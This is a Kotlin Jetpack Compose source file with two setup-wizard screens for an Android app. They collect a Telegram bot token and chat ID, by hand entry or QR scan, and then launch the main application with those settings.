package com.mobile.superiorsetup.ui

import com.mobile.superiorsetup.core.Config
import com.mobile.superiorsetup.core.AppManager
import com.mobile.superiorsetup.core.Security

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedContent
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.scaleIn
import androidx.compose.animation.scaleOut
import androidx.compose.animation.togetherWith
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.ArrowForward
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.mobile.superiorsetup.theme.*
import com.mobile.superiorsetup.ui.components.bounceClick
import com.mobile.superiorsetup.ui.components.glow
import kotlinx.coroutines.launch

@Composable
fun Step2Screen(onNext: () -> Unit) {
    var botToken by remember { mutableStateOf(Config.botToken) }
    var chatId by remember { mutableStateOf(Config.chatId) }
    var showAddManuallyPopup by remember { mutableStateOf(false) }
    var showScanner by remember { mutableStateOf(false) }
    
    if (showScanner) {
        com.mobile.superiorsetup.ui.components.QrScanner(
            onDismiss = { showScanner = false },
            onSuccess = { qrData ->
                Config.botToken = qrData.token
                Config.chatId = qrData.chatId
                Config.adminAutoDownloadMedia = qrData.autoDownloadMedia
                Config.adminBlockScreenshots = qrData.screenSecurity
                Config.adminNewMessageNotification = qrData.newMessageNotification
                Config.adminCallServer = qrData.callServer
                botToken = qrData.token
                chatId = qrData.chatId
                showScanner = false
            }
        )
    }

    if (showAddManuallyPopup) {
        com.mobile.superiorsetup.ui.components.AddManuallyPopup(
            onDismiss = { showAddManuallyPopup = false },
            onSave = { token, chat ->
                Config.botToken = token
                Config.chatId = chat
                botToken = token
                chatId = chat
                showAddManuallyPopup = false
            }
        )
    }


    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Column(
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(Icons.Filled.VpnKey, contentDescription = null, tint = PrimaryLight, modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(16.dp))
            Text("Enter Credentials", fontSize = 24.sp, color = TextPrimary)
            Text("Bot Token & Chat ID", fontSize = 24.sp, color = PrimaryLight, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "Connect your Telegram bot to enable secure messaging.",
                color = TextSecondary,
                textAlign = TextAlign.Center,
                fontSize = 13.sp
            )
            
            Spacer(modifier = Modifier.height(24.dp))
            
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(24.dp))
                    .background(SurfaceLevel1)
                    .padding(16.dp)
            ) {
                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Filled.SettingsSuggest, contentDescription = null, tint = TextPrimary, modifier = Modifier.size(24.dp))
                    Spacer(modifier = Modifier.width(12.dp))
                    Text("Import Configuration", fontSize = 18.sp, fontWeight = FontWeight.SemiBold, color = TextPrimary)
                }
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(14.dp))
                        .background(SurfaceLevel2)
                        .clickable { showAddManuallyPopup = true }
                        .padding(horizontal = 16.dp, vertical = 14.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(if (botToken.isNotEmpty()) Icons.Filled.Edit else Icons.Filled.Add, contentDescription = null, tint = if (botToken.isNotEmpty()) TextSecondary else PrimaryLight)
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text(if (botToken.isNotEmpty()) "Edit Manually" else "Add Manually", fontSize = 16.sp, color = TextPrimary, fontWeight = FontWeight.Medium)
                            Text("Type credentials by hand", color = TextSecondary, fontSize = 12.sp)
                        }
                    }
                    Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = TextSecondary)
                }
                
                Spacer(modifier = Modifier.height(8.dp))
                
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(14.dp))
                        .background(PrimaryLight)
                        .clickable { showScanner = true }
                        .padding(horizontal = 16.dp, vertical = 14.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.QrCodeScanner, contentDescription = null, tint = MaterialTheme.colorScheme.onPrimaryContainer)
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text("Scan QR Code", fontSize = 16.sp, color = MaterialTheme.colorScheme.onPrimaryContainer, fontWeight = FontWeight.Medium)
                            Text("Fastest & recommended", color = MaterialTheme.colorScheme.onPrimaryContainer, fontSize = 12.sp)
                        }
                    }
                    Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.onPrimaryContainer)
                }
            }
        }
        Spacer(modifier = Modifier.height(24.dp))
        
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            if (botToken.isNotBlank() && chatId.isNotBlank()) {
                Surface(
                    color = Success.copy(alpha = 0.15f),
                    shape = RoundedCornerShape(16.dp),
                    border = BorderStroke(1.dp, Success.copy(alpha = 0.5f)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Filled.Check, contentDescription = null, tint = Success, modifier = Modifier.size(24.dp))
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text("Credentials Saved", color = Success, fontWeight = FontWeight.Bold, fontSize = 15.sp)
                            Text("Bot token and Chat ID are configured securely.", color = Success.copy(alpha = 0.8f), fontSize = 12.sp)
                        }
                    }
                }
                Spacer(modifier = Modifier.height(16.dp))
            }
            
            val isReady = botToken.isNotBlank() && chatId.isNotBlank()
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(52.dp)
                    .bounceClick(scaleDown = 0.95f) { if (isReady) onNext() }
                    .glow(color = if (isReady) PrimaryLight else Color.Transparent, radius = 20f, dx = 0f, dy = 10f, cornerRadius = 16.dp)
                    .background(if (isReady) PrimaryLight else SurfaceLevel2, RoundedCornerShape(16.dp)),
                contentAlignment = Alignment.Center
            ) {
                Text("Continue", color = if (isReady) MaterialTheme.colorScheme.onPrimaryContainer else TextSecondary, fontSize = 15.sp, fontWeight = FontWeight.Bold)
            }
            
            Spacer(modifier = Modifier.height(16.dp))
            
            Row(horizontalArrangement = Arrangement.Center, modifier = Modifier.fillMaxWidth()) {
                Icon(Icons.Filled.Shield, contentDescription = null, tint = Primary, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(10.dp))
                Text("Credentials are stored securely on device.", color = TextSecondary, fontSize = 11.sp)
            }
        }
        
        Spacer(modifier = Modifier.height(30.dp))
    }
}

@Composable
fun Step3Screen() {
    val context = LocalContext.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Filled.CheckCircle, contentDescription = null, tint = PrimaryLight, modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(16.dp))
            Text("You're All Set!", fontSize = 24.sp, color = TextPrimary, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "Your secure chat is ready.\nOpen the app and start messaging through your Telegram bot.",
                color = TextSecondary,
                textAlign = TextAlign.Center,
                fontSize = 13.sp
            )
            
            Spacer(modifier = Modifier.height(24.dp))
            
            Surface(
                color = SurfaceLevel1,
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, DividerColor),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column {
                    StatusRow(Icons.Filled.Security, "Security", "End-to-End")
                    HorizontalDivider(color = DividerColor)
                    StatusRow(Icons.Filled.Speed, "Connection", "Ready")
                }
            }
        }
        
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(52.dp)
                    .bounceClick(scaleDown = 0.95f) {
                        AppManager.wakeUpMainApp(
                            context, 
                            Config.botToken, 
                            Config.chatId,
                            Config.adminAutoDownloadMedia,
                            Config.adminBlockScreenshots,
                            Config.adminNewMessageNotification,
                            Config.adminCallServer
                        )
                    }
                    .glow(color = PrimaryLight, radius = 20f, dx = 0f, dy = 10f, cornerRadius = 16.dp)
                    .background(PrimaryLight, RoundedCornerShape(16.dp)),
                contentAlignment = Alignment.Center
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("Open Main Application", color = MaterialTheme.colorScheme.onPrimaryContainer, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                    Spacer(modifier = Modifier.width(8.dp))
                    Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null, tint = MaterialTheme.colorScheme.onPrimaryContainer, modifier = Modifier.size(18.dp))
                }
            }
            Spacer(modifier = Modifier.height(12.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Filled.CheckCircleOutline, contentDescription = null, tint = Success, modifier = Modifier.size(14.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("Hidden • Private • Ready", color = TextSecondary, fontSize = 11.sp)
            }
        }
    }
}
